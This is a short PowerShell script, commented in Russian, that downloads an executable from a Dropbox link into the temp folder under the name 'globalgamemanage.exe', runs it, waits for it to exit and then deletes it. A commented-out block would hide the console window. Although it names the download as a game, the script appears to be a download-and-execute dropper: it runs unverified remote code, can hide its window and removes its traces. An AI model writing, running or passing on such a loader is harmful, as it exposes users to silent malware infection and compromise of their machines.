$ErrorActionPreference = "Stop"

# Прячем окно консоли на время (опционально, для эффекта)
# Add-Type -Name Window -Namespace Console -MemberDefinition '
# [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
# [DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
# $consolePtr = [Console.Window]::GetConsoleWindow()
# [Console.Window]::ShowWindow($consolePtr, 0) # 0 = скрыть

$GameUrl = "https://uc5bf4a11e9e17c243d299ace3ec.dl.dropboxusercontent.com/cd/0/get/DMUxGploAXm-0tJRilC3B8mgs46wMhC9hQnMMsg-FkwVn6m-tgkUmTTQ5I4YTqchLA7wtGVlf6kRgyQiRYcL3Nc5m8PPKZHSTyEbLM5CgJsqrCzufQKeDCtPP9pDbRa1-62bdvfi_c-c6QLLt5KjekzrTFl51EvvETpQ56J8jF0IIw/file?_download_id=085746869529595873064691644889032709839618747776893481506205460647&_log_download_success=1&c_luid=6d44cb05#"
$TempExe = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.exe"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing

$proc = Start-Process -FilePath $TempExe -PassThru
$proc.WaitForExit()

Remove-Item $TempExe -Force -ErrorAction SilentlyContinue
